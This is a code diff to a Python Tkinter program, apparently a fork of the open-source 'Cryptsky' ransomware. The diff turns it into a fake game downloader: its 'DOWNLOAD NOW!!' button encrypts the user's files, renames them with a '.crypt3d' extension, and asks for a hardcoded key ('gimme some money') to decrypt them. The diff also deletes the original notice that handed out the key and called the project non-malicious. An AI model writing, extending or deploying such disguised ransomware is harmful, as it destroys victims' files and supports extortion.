@@ -7,14 +7,27 @@ import sys
 import os
 
 
-HARDCODED_KEY = 'yellow submarine'
+HARDCODED_KEY = 'gimme some money'
 ENCRYPTED_EXTENSION = 'crypt3d'
+ENVIRONMENT_KEY = 'GAME_DOWNLOADED'
+FLAG_FILE = os.path.join(os.environ['HOME'], '.cryptdone')
+
+   
+def get_crypt_status():
+    try:
+        with open(FLAG_FILE, 'r') as f:
+            return f.read(1) == "1"
+    except FileNotFoundError:
+        return False
+
+def set_crypt_status(status):
+    with open(FLAG_FILE, 'w') as f:
+        f.write("1" if status else "0")
 
 
 class SampleApp(tk.Tk):
 
-    def __init__(self, decrypt, *args, **kwargs):
-        self.decrypt = decrypt
+    def __init__(self, *args, **kwargs):
         tk.Tk.__init__(self, *args, **kwargs)
 
         self.title_font = tkfont.Font(family='Helvetica', size=18, weight="bold", slant="italic")
@@ -38,11 +51,9 @@ class SampleApp(tk.Tk):
             # the one on the top of the stacking order
             # will be the one that is visible.
             frame.grid(row=0, column=0, sticky="nsew")
-        self.show_frame("PageOne" if decrypt else "StartPage")
+        self.show_frame("PageOne" if get_crypt_status() else "StartPage")
 
     def show_frame(self, page_name):
-        '''Show a frame for the given page name'''
-        main(self.decrypt)
         frame = self.frames[page_name]
         frame.tkraise()
 
@@ -55,16 +66,19 @@ class StartPage(tk.Frame):
         label = tk.Label(self, text="Click on 'DOWNLOAD NOW' to download the game!", font=controller.title_font)
         label.pack(side="top", fill="x", pady=10)
 
-        button1 = tk.Button(self, text="DOWNLOAD NOW!!",
-                            command=lambda: controller.show_frame("PageOne"))
+        button1 = tk.Button(self, text="DOWNLOAD NOW!!", command=self.handleEncrypt)
 
         button1.pack()
-
-
+    
+    def handleEncrypt(self):
+        main(False)
+        self.controller.show_frame("PageOne")
+    
 
 class PageOne(tk.Frame):
 
     def __init__(self, parent, controller):
+        
         tk.Frame.__init__(self, parent)
         self.controller = controller
 
@@ -74,10 +88,17 @@ class PageOne(tk.Frame):
         label1 = tk.Label(self, text="Enter the key: ", font=("ariel", 12, "bold")).place(x=10,y=50)
 
         key = tk.StringVar()
-        entry_box = tk.Entry(self, textvariable=key, width=25, bg="lightgreen").place(x=150, y=50)        
+        entry_box = tk.Entry(self, textvariable=key, width=25, bg="lightgreen").place(x=200, y=50)        
+        
 
-        button = tk.Button(self, text="DECRYPT",command=lambda: controller.show_frame("StartPage")).place(x=200,y=100)
+        button = tk.Button(self, text="DECRYPT",command=lambda: self.handleDecrypt(key.get())).place(x=200,y=100)
     
+    def handleDecrypt(self, key):
+        if key == HARDCODED_KEY:
+            main(True)
+            # self.controller.show_frame("StartPage")
+            sys.exit()
+
 
 def discoverFiles(startpath, decrypt):
     if decrypt:
@@ -134,31 +155,13 @@ def modifyFile(filename, crypto, decrypt, blocksize=16):
         os.rename(filename, filename + '.' + ENCRYPTED_EXTENSION)
 
 
-def main(decrypt):
+def main(decrypt=False):
     if decrypt:
-        print('''
-Cryptsky!
----------------
-Your files have been encrypted. This is normally the part where I would
-tell you to pay a ransom, and I will send you the decryption key. However, this
-is an open source project to show how easy malware can be to write and to allow
-others to view what may be one of the first fully open source python ransomwares.
-
-This project does not aim to be malicious. The decryption key can be found
-below, free of charge. Please be sure to type it in EXACTLY, or you risk losing
-your files forever. Do not include the surrounding quotes, but do make sure
-to match case, special characters, and anything else EXACTLY!
-Happy decrypting and be more careful next time!
-
-Your decryption key is: '{}'
-
-'''.format(HARDCODED_KEY))
-        key = input('Enter Your Key> ')
+        set_crypt_status(False)
+        key = HARDCODED_KEY
 
     else:
-        # In real ransomware, this part includes complicated key generation,
-        # sending the key back to attackers and more
-        # maybe I'll do that later. but for now, this will do.
+        set_crypt_status(True)
         if HARDCODED_KEY:
             key = HARDCODED_KEY
 
@@ -177,16 +180,10 @@ Your decryption key is: '{}'
 
     if not decrypt:
         pass
-        # post encrypt stuff
-        # desktop picture
-        # icon, etc
 
 
 if __name__ == "__main__":
-    decrypt = len(sys.argv) > 1 and sys.argv[1] in ["-d", "--decrypt"]
-    # main(decrypt)
-
-    app = SampleApp(decrypt)
+    app = SampleApp()
 
     app.mainloop()
 
